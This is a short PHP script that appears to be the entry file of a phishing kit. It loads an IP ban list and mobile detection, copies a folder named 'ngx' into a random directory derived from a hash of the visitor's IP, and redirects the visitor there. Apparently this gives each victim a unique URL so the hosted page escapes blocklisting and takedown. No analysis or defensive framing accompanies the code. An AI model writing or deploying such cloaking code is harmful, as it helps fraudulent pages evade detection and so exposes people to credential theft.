<?php
include 'banned-ip.php';
require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
if ( !$detect->isMobile() ) {
 //die();
}

$random = rand(0, 100000) . $_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 5);
function recurse_copy($src, $dst)
{
    $dir    = opendir($src);
    $result = ($dir === false ? false : true);
    if ($result !== false) {
        $result = @mkdir($dst);
        if ($result === true) {
            while (false !== ($file = readdir($dir))) {
                if (($file != '.') && ($file != '..') && $result) {
                    if (is_dir($src . '/' . $file)) {
                        $result = recurse_copy($src . '/' . $file, $dst . '/' . $file);
                    } else {
                        $result = copy($src . '/' . $file, $dst . '/' . $file);
                    }
                }
            }
            closedir($dir);
        }
    }
    return $result;
}
$src = "ngx";
recurse_copy($src, $dst);
header("location:" . $dst . "");
exit;
?>